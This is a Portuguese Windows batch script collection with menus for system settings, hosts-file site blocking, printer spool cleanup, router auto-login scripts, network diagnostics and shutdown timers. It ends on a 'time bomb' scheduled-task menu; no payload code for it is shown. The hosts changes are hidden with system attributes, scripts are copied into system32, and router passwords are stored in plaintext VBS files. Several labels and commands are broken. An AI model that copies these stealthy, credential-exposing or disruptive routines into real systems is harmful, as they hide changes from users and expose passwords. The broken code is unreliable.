echo  บบบบบบบบบบบฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟบบบบบบบบบ 
echo  บบบบบบบบบบบณ     js Criptografia em Script.bat        ณ ณ 2 - afargotpircseD  ณบบบบบบบบบ 
echo  บบบบบบบบบบบภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤูบบบบบบบบบ 
echo  บบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบบ 
echo  ๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕๕ 
echo  อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ 
echo.    

pause
goto menu
::==============================================================================================
::==================================    propriedades do sistema             ========================
::==============================================================================================


@ echo off
GOTO PRO

\SystemPropertiesAdvanced .................................(   propriedades do sistema )
                   \SystemPropertiesComputerName .......................(   propriedades do sistema nome do computador   )
                   \SystemPropertiesDataExecutionPrevention .....(   propriedade do sistema execusใode preve็ใo      )
                   \SystemPropertiesHardware ..................................(   priedade do sistema hardware       )
                   \SystemPropertiesPerformance ............................(   priedade do sistema desempenho    )
                   \SystemPropertiesProtection .................................(  priedade do sistema prote็ใo    )
                   \SystemPropertiesRemote


echo off

:PROPIEDADES DO SISTEMA 
   : PRO 
CLS 
time /t
date /t
echo   อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo             PROPIEDADES DO SISTEMA             
echo   อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ               
color 2f
echo  อ           a) Prop sistema NOME PC
echo  อ           b) Prop sistema PREVENวรO DE DADOS
echo  อ           c) Prop sistema HARDWARE
echo  อ           d) Prop sistema PERFORMANCE
echo  อ           e) Prop sistema REMOTO
echo  อ           V) VOLTAR
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo                     DEDE WIZARD                                                                        
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
SET /P OP=Digite sua op็โo? 
if %op% equ a goto a
if %op% equ b goto b
if %op% equ c goto c
if %op% equ d goto d
if %op% equ e goto e
if %op% equ f  goto  f
if %op% equ g goto g
if %op% equ h goto h
if %op% equ  i goto  i
if %op% equ v goto v
if %op% equ  V goto  V

:a

SystemPropertiesComputerName

CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo: VOLTAR PARA   PROPIEDADES DO SISTEMA 
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto  COMP 
 :NAO
cls
 goto  PRO 


 :b
SystemPropertiesDataExecutionPrevention
CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo: VOLTAR PARA   PROPIEDADES DO SISTEMA 
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto  COMP 
 :NAO
cls
 goto  PRO 



:c
SystemPropertiesHardware

CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo: VOLTAR PARA   PROPIEDADES DO SISTEMA 
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto  COMP 
 :NAO
cls
 goto  PRO 


:d
SystemPropertiesPerformance
CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo: VOLTAR PARA   PROPIEDADES DO SISTEMA 
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto  COMP 
 :NAO
cls
 goto  PRO 


:e
SystemPropertiesProtection
CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo: VOLTAR PARA   PROPIEDADES DO SISTEMA 
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto  COMP 
 :NAO
cls
 goto  PRO 
:F
CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo: VOLTAR PARA   PROPIEDADES DO SISTEMA 
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto  COMP 
 :NAO
cls
 goto  PRO 

::==============================================================================================
::==================================          bloquear sayts            ========================
::==============================================================================================
@echo offF

cd "%windir%\system32\drivers\etc"
xcopy /q /y hosts
rename hosts host

cls
echo # Copyright (c) 1993-1999 Microsoft Corp. >> hosts
echo # >>hosts
echo # Este ้ um arquivo HOSTS de exemplo usado pelo Microsoft TCP/IP para Windows.  >> hosts
echo #  >> hosts
echo # Este arquivo cont้m os mapeamentos de endere็os IP para nomes de host. Cada  >> hosts
echo # entrada deve ser mantida em uma linha individual. O endere็o IP deve  >> hosts
echo # ser colocado na primeira coluna, seguido do nome de host correspondente.  >> hosts
echo # O endere็o IP e o nome do host devem ser separados por pelo menos um  >> hosts
echo # espa็o.  >> hosts
echo # >> hosts
echo # Adicionalmente, comentแrios (como estes) podem ser inseridos em linhas  >> hosts
echo # individuais ou ap๓s o nome de computador indicado por um sํmbolo '#'. >> hosts
echo # >> hosts
echo # Por exemplo: >> hosts
echo # >> hosts
echo # 102.54.94.97 rino.acme.com # servidor de origem >> hosts
echo # 38.25.63.10 x.acme.com # host cliente x >> hosts

echo 127.0.0.1 localhost >> hosts

echo 0.0.0.0 AQUI O SITE QUE DESEJA BLOQUEAR >> hosts


cd "%windir%\system32\drivers\etc"
attrib +h +s hosts

exit

( AQUI COMANDO PARA VOLTAR AO NORMAL )

 @echo off
cd "%windir%\system32\drivers\etc"
attrib -h -s hosts
del hosts
cd "%windir%\system32\drivers\etc"

cls
echo # Copyright (c) 1993-1999 Microsoft Corp. >> hosts
echo # >> hosts
echo # Este ้ um arquivo HOSTS de exemplo usado pelo Microsoft TCP/IP para Windows. >> hosts
echo # >> hosts
echo # Este arquivo cont้m os mapeamentos de endere็os IP para nomes de host. Cada >> hosts
echo # entrada deve ser mantida em uma linha individual. O endere็o IP deve >> hosts
echo # ser colocado na primeira coluna, seguido do nome de host correspondente. >> hosts
echo # O endere็o IP e o nome do host devem ser separados por pelo menos um >> hosts
echo # espa็o. >> hosts
echo #>> hosts
echo # Adicionalmente, comentแrios (como estes) podem ser inseridos em linhas >> hosts
echo # individuais ou ap๓s o nome de computador indicado por um sํmbolo '#'. >> hosts
echo #>> hosts
echo # Por exemplo: >> hosts
echo # >> hosts
echo # 102.54.94.97 rino.acme.com # servidor de origem >> hosts
echo # 38.25.63.10 x.acme.com # host cliente x >> hosts

echo 127.0.0.1 localhost >> hosts

cd "%windir%\system32\drivers\etc"
attrib +h +s hosts

exit


::==============================================================================================
::==================================  bloquei de saites              ========================
::==============================================================================================
@echo off

cd "%windir%\system32\drivers\etc"
xcopy /q /y hosts
rename hosts host

cls
echo # Copyright (c) 1993-1999 Microsoft Corp. >> hosts
echo # >>hosts
echo # Este ้ um arquivo HOSTS de exemplo usado pelo Microsoft TCP/IP para Windows.  >> hosts
echo #  >> hosts
echo # Este arquivo cont้m os mapeamentos de endere็os IP para nomes de host. Cada  >> hosts
echo # entrada deve ser mantida em uma linha individual. O endere็o IP deve  >> hosts
echo # ser colocado na primeira coluna, seguido do nome de host correspondente.  >> hosts
echo # O endere็o IP e o nome do host devem ser separados por pelo menos um  >> hosts
echo # espa็o.  >> hosts
echo # >> hosts
echo # Adicionalmente, comentแrios (como estes) podem ser inseridos em linhas  >> hosts
echo # individuais ou ap๓s o nome de computador indicado por um sํmbolo '#'. >> hosts
echo # >> hosts
echo # Por exemplo: >> hosts
echo # >> hosts
echo # 102.54.94.97 rino.acme.com # servidor de origem >> hosts
echo # 38.25.63.10 x.acme.com # host cliente x >> hosts

echo 127.0.0.1 localhost >> hosts

echo 0.0.0.0 AQUI O SITE QUE DESEJA BLOQUEAR >> hosts


cd "%windir%\system32\drivers\etc"
attrib +h +s hosts

exit

( AQUI COMANDO PARA VOLTAR AO NORMAL )

 @echo off
cd "%windir%\system32\drivers\etc"
attrib -h -s hosts
del hosts
cd "%windir%\system32\drivers\etc"

cls
echo # Copyright (c) 1993-1999 Microsoft Corp. >> hosts
echo # >> hosts
echo # Este ้ um arquivo HOSTS de exemplo usado pelo Microsoft TCP/IP para Windows. >> hosts
echo # >> hosts
echo # Este arquivo cont้m os mapeamentos de endere็os IP para nomes de host. Cada >> hosts
echo # entrada deve ser mantida em uma linha individual. O endere็o IP deve >> hosts
echo # ser colocado na primeira coluna, seguido do nome de host correspondente. >> hosts
echo # O endere็o IP e o nome do host devem ser separados por pelo menos um >> hosts
echo # espa็o. >> hosts
echo #>> hosts
echo # Adicionalmente, comentแrios (como estes) podem ser inseridos em linhas >> hosts
echo # individuais ou ap๓s o nome de computador indicado por um sํmbolo '#'. >> hosts
echo #>> hosts
echo # Por exemplo: >> hosts
echo # >> hosts
echo # 102.54.94.97 rino.acme.com # servidor de origem >> hosts
echo # 38.25.63.10 x.acme.com # host cliente x >> hosts

echo 127.0.0.1 localhost >> hosts

cd "%windir%\system32\drivers\etc"
attrib +h +s hosts

exit


========================================================================
===============      bloqueio           ================================
========================================================================

@echo off

cd "%windir%\system32\drivers\etc"
xcopy /q /y hosts
rename hosts host

cls
echo # Copyright (c) 1993-1999 Microsoft Corp. >> hosts
echo # >>hosts
echo # Este ้ um arquivo HOSTS de exemplo usado pelo Microsoft TCP/IP para Windows.  >> hosts
echo #  >> hosts
echo # Este arquivo cont้m os mapeamentos de endere็os IP para nomes de host. Cada  >> hosts
echo # entrada deve ser mantida em uma linha individual. O endere็o IP deve  >> hosts
echo # ser colocado na primeira coluna, seguido do nome de host correspondente.  >> hosts
echo # O endere็o IP e o nome do host devem ser separados por pelo menos um  >> hosts
echo # espa็o.  >> hosts
echo # >> hosts
echo # Adicionalmente, comentแrios (como estes) podem ser inseridos em linhas  >> hosts
echo # individuais ou ap๓s o nome de computador indicado por um sํmbolo '#'. >> hosts
echo # >> hosts
echo # Por exemplo: >> hosts
echo # >> hosts
echo # 102.54.94.97 rino.acme.com # servidor de origem >> hosts
echo # 38.25.63.10 x.acme.com # host cliente x >> hosts

echo 127.0.0.1 localhost >> hosts

echo 0.0.0.0 AQUI O SITE QUE DESEJA BLOQUEAR >> hosts


cd "%windir%\system32\drivers\etc"
attrib +h +s hosts

exit







========================================================================
===============copiar os arquivos=======================================
========================================================================

xcopy /f /s /q /y normal.cmd %windir%\system32
xcopy /f /s /q /y bloquear.cmd %windir%\system32
del /f /s /q normal.cmd
del /f /s /q bloquear.cmd
del /f /s /q copia.cmd
pause





 


::==============================================================================================
::==================================              normal           ========================
::==============================================================================================

 @echo off
cd "%windir%\system32\drivers\etc"
attrib -h -s hosts
del hosts
cd "%windir%\system32\drivers\etc"

cls
echo # Copyright (c) 1993-1999 Microsoft Corp. >> hosts
echo # >> hosts
echo # Este ้ um arquivo HOSTS de exemplo usado pelo Microsoft TCP/IP para Windows. >> hosts
echo # >> hosts
echo # Este arquivo cont้m os mapeamentos de endere็os IP para nomes de host. Cada >> hosts
echo # entrada deve ser mantida em uma linha individual. O endere็o IP deve >> hosts
echo # ser colocado na primeira coluna, seguido do nome de host correspondente. >> hosts
echo # O endere็o IP e o nome do host devem ser separados por pelo menos um >> hosts
echo # espa็o. >> hosts
echo #>> hosts
echo # Adicionalmente, comentแrios (como estes) podem ser inseridos em linhas >> hosts
echo # individuais ou ap๓s o nome de computador indicado por um sํmbolo '#'. >> hosts
echo #>> hosts
echo # Por exemplo: >> hosts
echo # >> hosts
echo # 102.54.94.97 rino.acme.com # servidor de origem >> hosts
echo # 38.25.63.10 x.acme.com # host cliente x >> hosts

echo 127.0.0.1 localhost >> hosts

cd "%windir%\system32\drivers\etc"
attrib +h +s hosts

exit

::==============================================================================================
::================================== midia player             ========================
::==============================================================================================

@echo off
color 3F
title criando atalhos
echo ออออออออออออออออออออออออออออออออออออออออออออ
echo    ARRASTE SEU ARQUIVO PARA ESTA JANELA
echo ออออออออออออออออออออออออออออออออออออออออออออ
set/p A=

CLS

echo ออออออออออออออออออออออออออออออออออออออออออออ
echo    DIDIGTE O NOME DO ATALHO
echo ออออออออออออออออออออออออออออออออออออออออออออ
set/p n=

echo @echo off >> %n%.bat
echo mode 20,5 >> %n%.bat
echo start "%ProgramFiles%\Windows Media Player" %A% >> %n%.bat


::==============================================================================================
::================================== iniciar na pasta temp            ========================
::==============================================================================================
@echo off
COLOR 3F
title atalhos com o midia palyer
mode 60,15
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo      W I N D O W S    M I D I A   P L A Y E R
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
echo.
echo       ARRASTE SEU ARQUIVO PARA ESTA JANELA 
echo.
echo          E APERTE ENTER PARA INICIAR 
echo.
echo.
set /p f=
echo @ echo off > %temp%\dede.cmd
echo mode 20,3 >> %temp%\dede.cmd
ECHO start "%ProgramFiles%\Windows Media Player" %f% >> %temp%\dede.cmd
ECHO exit >> %temp%\dede.cmd


COLOR 0F
CLS
echo.
echo.
echo.
echo.
echo ออออออออ  CARREGANDO
ping localhost -n 2 >nul


COLOR 04
CLS
echo.
echo.
echo.
echo.
echo อออออออออออออ  CARREGANDO
ping localhost -n 2 >nul

COLOR 0f
CLS
echo.
echo.
echo.
echo.
echo อออออออออออออออออออออออออ  CARREGANDO
ping localhost -n 2 >nul

COLOR 04
CLS
echo.
echo.
echo.
echo.
echo อออออออออออออออออออออออออออออออออออออออออ  CARREGANDO
ping localhost -n 2 >nul
COLOR 0f


ping localhost -n 2 >nul

start %temp%\dede.cmd
ping localhost -n 2 >nul
ping localhost -n 2 >nul

del /s /q %temp%\dede.cmd





::==============================================================================================
::==================================    prompt           ========================
::==============================================================================================

::=====ABRIR A PASTA DO USUARIO =============
start %HOMEDRIVE%%HOMEPATH%

::====== ABRIR  PROMPT DE COMAMNDO ==========
start %windir%\system32\cmd.exe 
START C:\Users\%username%\Desktop\wyzard

::==============================================================================================
::===========================================IMPRESSORA=========================================                                                             ========================
::==============================================================================================
:IMP

@echo off
Color 3F
title APAGAR ARQUIVOS DE IMPRESSAO
cls
echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo  APAGAR ARQUIVOS DE IMPRESSORA
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
echo     DIGITE A OPCAO DO SISTEMA INSTALADO
echo.
echo     WINDOS 7  ( 7 )
echo.
echo     WINDOS 8  ( 8 ) 
echo.
echo     WINDOS XP  ( XP )
echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
set /p fg=
if %fg% equ 7 goto W7
if %fg% equ 8 goto W8
if %fg% equ XP goto XP
echo MsgBox " CAPS LOOK DESLIGADO COMANDO [ %fg% ] NรO ACEITO  ",vbOKOnly + vbInformation, "ERRO DE DIGITAวรO" >%temp%\wyz.vbs
start %temp%\wyz.vbs
goto IMP

:W7

::echo Interrompendo o Spooler
net stop spooler
::pauseecho Acessando a pasta de impressoras
cd %systemroot%\system32\spool\PRINTERS
::echo Deletando os arquivos SHD
del /f /s *.shd
::echo Deletando os arquivos SPL
del /f /s *.spl
::echo Iniciando o Spooler
net start spooler

echo MsgBox " ARQUIVOS EXCLUDOS COM SUCESSO !!!! ",vbOKOnly + vbInformation, "ARQUIVOS EXCLUIDOS" >%temp%\wyz.vbs
start %temp%\wyz.vbs
goto IMP

:W8

::echo Interrompendo o Spooler
net stop spooler
::pauseecho Acessando a pasta de impressoras
cd %systemroot%\system32\spool\PRINTERS
::echo Deletando os arquivos SHD
del /f /s *.shd
::echo Deletando os arquivos SPL
del /f /s *.spl
::echo Iniciando o Spooler
net start spooler

echo MsgBox " ARQUIVOS EXCLUDOS COM SUCESSO !!!! ",vbOKOnly + vbInformation, "ARQUIVOS EXCLUIDOS" >%temp%\wyz.vbs
start %temp%\wyz.vbs
goto IMP

:XP

net stop spooler
cd %systemroot%\system32\spool\PRINTERS
del /f /s *.SHD
del /f /s *.SPL
net start spooler

echo MsgBox " ARQUIVOS EXCLUDOS COM SUCESSO !!!! ",vbOKOnly + vbInformation, "ARQUIVOS EXCLUIDOS" >%temp%\wyz.vbs
start %temp%\wyz.vbs
goto IMP

::==============================================================================================
::=======================================  INTERNETE   =========================================
::==============================================================================================
:NET
cls
echo =====================================
echo INTERNETE E ROTEADORES
echo =====================================
echo.
echo ( 1 ) ROTEADORES
echo.
echo ( 2 ) INTERNET
echo.
echo ( V ) volta para o menu
echo.
set /p nt=
if %nt% ==1 goto st
if %nt% ==2 goto net1
if %nt% ==V GOTO MENU
if %nt% ==v goto menu




@echo off
color a
:st
echo ========================
echo O ROTEADOR PRECISA DE 
echo ========================
echo.
echo  ( 1 )IP /SENHA
echo.
echo  ( 2 )IP /USUARIO /SENHA
echo.
echo  ( 3 )IP /USUARIO /EMAIL /SENHA 
set /p op=
if %op% ==1 goto 1
if %op% ==2 goto 2
if %op% ==3 goto 3

cls
:1
cls
echo  ( 1 )IP /SENHA
echo =========================
echo COLE O Ip DO SITE
echo =========================
set /p iproot=
cls
echo  ( 1 )IP /SENHA
echo =========================
echo DIGITE A SENHA
echo =========================
set /p pass=
cls
echo  ( 1 )IP /SENHA
echo =========================
echo DIGITE O NOME DO ROTEADOR
echo =========================
set /p rnem=
cls

echo set wizard = createobject("wscript.shell") >>%rnem%.vbs
echo wizard.run "%iproot%" >>%rnem%.vbs
echo wscript.sleep (10000)  >>%rnem%.vbs
echo wizard.sendkeys ("%pass%")  >>%rnem%.vbs
echo wscript.sleep (1000) >>%rnem%.vbs 
echo wizard.sendkeys "{Enter}" >>%rnem%.vbs 

goto st







:2
cls
echo  ( 2 )IP /USUARIO /SENHA
echo =========================
echo COLE O IP DO SITE
echo =========================
set /p iproot=
cls
echo  ( 2 )/IP /USUARIO /SENHA
echo =========================
echo DIGITE O USUARIO
echo =========================
set /p user=
cls
echo  ( 2 )IP /USUARIO /SENHA
echo =========================
echo DIGITE A SENHA
echo =========================
set /p pass=
cls
echo  ( 2 )IP /USUARIO /SENHA
echo =========================
echo DIGITE O NOME DO ROTEADOR
echo =========================
set /p rnem=
cls
echo set wizard = createobject("wscript.shell") >>%rnem%.vbs
echo wizard.run "%iproot%" >>%rnem%.vbs
echo wscript.sleep (10000)  >>%rnem%.vbs
echo wizard.sendkeys ("%user%") >>%rnem%.vbs 
echo wscript.sleep (1000) >>%rnem%.vbs
echo wizard.sendkeys ("%pass%")  >>%rnem%.vbs
echo wscript.sleep (1000) >>%rnem%.vbs 
echo wizard.sendkeys "{Enter}" >>%rnem%.vbs 
goto st

:3
cls
color a

echo  ( 3 )LINK /EMAIL /SENHA
echo =========================
echo COLE O LINK DO SITE
echo =========================
set /p iproot=
cls
echo  ( 3 )LINK /EMAIL /SENHA
echo =========================
echo DIGITE O EMAIL
echo =========================
set /p user=
cls
echo  ( 3 )LINK /EMAIL /SENHA
echo =========================
echo DIGITE A SENHA
echo =========================
set /p pass=
cls
echo  ( 3 )LINK /EMAIL /SENHA
echo =========================
echo DIGITE O NOME DO SITE
echo =========================
set /p rnem=
cls

echo set wizard = createobject("wscript.shell") >>%rnem%.vbs
echo wizard.run "%iproot%" >>%rnem%.vbs
echo wscript.sleep (10000)  >>%rnem%.vbs
echo wizard.sendkeys ("%user%") >>%rnem%.vbs
echo wscript.sleep (1000) >>%rnem%.vbs  
echo wizard.sendkeys ("%pass%")  >>%rnem%.vbs
echo wscript.sleep (1000) >>%rnem%.vbs 
echo wizard.sendkeys "{Enter}" >>%rnem%.vbs 

goto st











:net1

::Publicado em 09/09/2012
@echo off
title. ( Programa estar verificando conecxoes portas caminhos e excutaveis envolvidos ) 
color 0a
echo.
echo SEJA BEN-VINDO USUARIO EU SOU O SCRIPT CRIADO PELO 
echo.
echo.
echo ____________________ (WYZARD) _______________________
echo.

echo ****************************************ญ****************************************


mkdir "Copias da pasta Run"
echo.
echo FOI CRIADA UMA PASTA COM O NOME ( COPIAS DA PASTA RUN ) 
echo.
echo PARA O MESMO LOCAL ONDE FOI EXECULTADO ESTE ARQUIVO 
echo.
echo E DENTRO DELA FORAM EXPORTADAS DUAS COPIAS 
echo.
echo ( .REG ) VA NA OPCAO EDITAR DESTES ARQUIVOS E VEJA 
echo.
echo O QUE ESTA ABRINDO JUNTO COM O WINDOWS SAO 
echo.
echo COPIAS DA CHAVE ( HKEY_LOCAL_MACHINE ) DA PASTA ( Run ) 
echo.
echo NOME DO ARQUIVO (1) ( HKLM-Run.reg ) E DA CHAVE ( CHAVE HKEY_CURRENT_USER ) 
echo.
echo TAMBEM DA PASTA ( Run ) NOME DO ARQUIVO (2) ( HKCU-Run.reg ) 
echo.
echo ( ATENCAO )
echo.
echo NO WINDOWS VISTA E WINDOWS 7 PARA MOSTRA O EXECUTAVEL
echo.
echo QUE ESTA SE CONECTANDO A VOCE TEM QUE EXCUTAR COMO ADMINISTRADOR
echo.
echo NESTE CASO A PASTA "Copias da pasta Run" COM AS COPIAS DO REGISTRO 
echo.
echo VAI SER CRIADA NA PASTA ( system32 )
echo.
REG EXPORT "HKLM\SOFTWARE\Microsoft\Windows\CurrentญVersion\Run" "Copias da pasta Run"\HKLM-Run.reg 
REG EXPORT "HKCU\SOFTWARE\Microsoft\Windows\CurrentญVersion\Run" "Copias da pasta Run"\HKCU-Run.reg 

echo ========================================ญ========================================
echo ( * VERIFICACAO DE CONEXOES * )
time /t
echo ______________
date /t
echo ========================================ญ========================================
echo [ ENDERECO LOCAL ] [ ENDERECO EXTERNO ] [ IP ] [ PORTAS ] [ CONECXOES ] 
echo ========================================ญ========================================
NETSTAT -n 


echo ========================================ญ========================================
echo EXECUTAVEIS RESPONSAVEIS PELA CONECXAO COM O COMPUTADOR
echo ========================================ญ========================================

NETSTAT -b 

echo ========================================ญ========================================
echo ****************************************ญ****************************************
echo ( * FIM... DESTA VERIFICACAO * )
time /t
echo ______________
date /t
echo ========================================ญ========================================
echo ****************************************ญ****************************************
echo ( WYZARD SCRIPTS )
echo.
echo ========================================ญ========================================
start taskmgr.exe


@echo off
        title 10 Formas De Olhar O Ip
        :inicio
        color fc
        echo 1: IPCONFIG
        ping -n 3 localhost>nul
        ipconfig
        echo.
        echo 2: ARP
        ping -n 3 localhost>nul
        arp -a
        echo.
        echo 3: ROUTE PRINT
        ping -n 3 localhost>nul
        route print
        echo.
        echo 4: NETSTAT
        ping -n 3 localhost>nul
        netstat -r
        echo.
        echo 5:NSLOOKUP
        ping -n 3 localhost>nul
        nslookup %computername% 2
        echo.
        echo 6: NETSH DIAG SHOW IP
        ping -n 3 localhost>nul
        netsh diag show ip
        echo.
        echo 7: SYSTEMINFO
        ping -n 3 localhost>nul
        systeminfo
        echo.
        echo 8: WMIC NICCONFIG GET IPADDERSS
        ping -n 3 localhost>nul
        WMIC NICCONFIG GET IPADDERSS
        echo.
        echo 9: PING
        ping -n 3 locahost>nul
        ping %computername%
        echo.
        echo 10: TRACERT
        ping -n 3 localhost>nul
        tracert %computername%
        pause >nul

PAUSE
GOTO MENU
::==============================================================================================
::==================================DESLIGAMENTO DO WINDOWS=====================================
::==============================================================================================

@echo off
:deswin
CLS
TITLE DESLIGANDO O WINDOWS
COLOR 3F
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo    TEMPO DE DESLIGAMENTO DO WINDOWS
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
echo  (0) DESLIGA AUTOMATICO
echo  (1) MINUTO
echo  (2) MINUTO
echo  (3) MINUTO
echo  (4) MINUTO
echo  (5) MINUTO
echo  (6) MINUTO
echo  (7) MINUTO
echo  (8) MINUTO
echo  (9) MINUTO
echo  (10)MINUTO
echo  (20) MINUTO
echo  (30)MEIA HORA
echo  (60) 1 HORA
ECHO  (120)2 HORAS
ECHO  (180)3 HORAS
ECHO  (240)4 HORAS
ECHO  (V) VOLTAR PRO MENU 
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo. 
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
set /p t=

if %t% equ 0 goto DES
if %t% equ 1 goto m1
if %t% equ 2 goto m2
if %t% equ 3 goto m3
if %t% equ 4 goto m4
if %t% equ 5 goto m5
if %t% equ 6 goto m6
if %t% equ 7 goto m7
if %t% equ 8 goto m8
if %t% equ 9 goto m9
if %t% equ 10 goto m10
if %t% equ 20 goto m20
if %t% equ 30 goto m30
if %t% equ 60 goto 1h
if %t% equ 120 goto 2h
if %t% equ 180 goto 3h
if %t% equ 240 goto 4h
if %t% equ V goto MENU
if %t% equ v goto MENU





:m1
@echo off >> 1desliga.cmd
echo shutdown -s -t 60 >> 1desliga.cmd
echo exit  >> 1desliga.cmd
goto deswin

:m2

echo @echo  >> 2desliga.cmd
echo shutdown -s -t 120 >> 2desliga.cmd
echo exit  >> 2desliga.cmd
goto deswin

:m3

echo @echo  >> 3desliga.cmd
echo shutdown -s -t 180 >> 3desliga.cmd
echo exit  >> 3desliga.cmd
goto deswin

:m4
echo @echo  >> 4desliga.cmd
echo shutdown -s -t 240 >> 4desliga.cmd
echo exit  >> 4desliga.cmd
goto deswin

:m5

echo @echo  >> 5desliga.cmd
echo shutdown -s -t 300 >> 5desliga.cmd
echo exit  >> 5desliga.cmd
goto deswin

:m6

echo @echo  >> 6desliga.cmd
echo shutdown -s -t 360 >> 6desliga.cmd
echo exit  >> 6desliga.cmd
goto deswin

:m7

echo @echo  >> 7desliga.cmd
echo shutdown -s -t 420 >> 7desliga.cmd
echo exit  >> 7desliga.cmd
goto deswin

:m8

echo @echo  >> 8desliga.cmd
echo shutdown -s -t 480 >> 8desliga.cmd
echo exit  >> 8desliga.cmd
goto deswin

:m9

echo @echo  >> 9desliga.cmd
echo shutdown -s -t 540 >> 9desliga.cmd
echo exit  >> 9desliga.cmd
goto deswin

:m10

echo @echo  >> 10desliga.cmd
echo shutdown -s -t 600 >> 10desliga.cmd
echo exit  >> 10desliga.cmd
goto deswin

:m20

echo @echo  >> 20desliga.cmd
echo shutdown -s -t 1200 >> 20desliga.cmd
echo exit  >> 20desliga.cmd
goto deswin

:m30

echo @echo  >> desligameia_h.cmd
echo shutdown -s -t 1800 >> desligameia_h.cmd
echo exit  >> desligameia_h.cmd
goto deswin

:1h

echo @echo  >> des1h.cmd
echo shutdown -s -t 3600 >> des1h.cmd
echo exit  >> des1h.cmd
goto deswin

:2h

echo @echo  >> des2h.cmd
echo shutdown -s -t 7200 >> des2h.cmd
echo exit  >> des2h.cmd
goto deswin

:3h

echo @echo  >> des3h.cmd
echo shutdown -s -t 10800 >> des3h.cmd
echo exit  >> des3h.cmd
goto deswin

:4h

echo @echo  >> des4h.cmd
echo shutdown -s -t 14400 >> des4h.cmd
echo exit  >> des4h.cmd
goto deswin


:DES
echo @echo  >> OFF.cmd
echo shutdown -s -t 0 >> OFF.cmd
echo exit  >> OFF.cmd
goto deswin


GOTO MENU

::==============================================================================================
::=======================================   BOMBA   ============================================
::==============================================================================================

@echo off
:bomb2
Color A
cls
echo.
echo ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo.
echo   CRIAR TAREFA AGENDADA PARA O RELOGIO ( TR )
echo.
echo   COPIAR PARA  ( COPY )  
echo.
echo    COPIAR PRA PASTA DE SISTEMA ( COPY )
echo.
echo    BOMBA RELOGIO COM 7 DISPAROS (A )
echo.
echo    BOMBA RELOGIO COM 15 DISPAROS ( B )
echo.
echo    BOMBA RELOGIO COM 30 DISPAROS ( C )
echo.
echo    CRIAR RELOGIO COM DISPARADORES ( RL )
echo.
echo    PARA VOLTAR PARA INICIO DIGITE  ((  v  ))
echo.
